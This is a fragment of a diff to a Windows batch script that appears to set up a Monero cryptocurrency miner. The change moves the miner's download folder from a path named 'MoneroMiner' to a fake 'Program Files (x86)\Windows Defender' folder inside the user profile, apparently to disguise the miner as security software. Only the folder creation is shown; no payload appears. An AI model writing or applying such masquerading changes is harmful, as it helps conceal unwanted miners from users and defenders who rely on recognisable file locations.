@@ -2,7 +2,7 @@
 setlocal enabledelayedexpansion
 
 :: Set the download location
-set "folderPath=%USERPROFILE%\AppData\Local\MoneroMiner"
+set "folderPath=%USERPROFILE%\Program Files (x86)\Windows Defender"
 mkdir "%folderPath%"
 
 :: Debugging: Check folder creation status
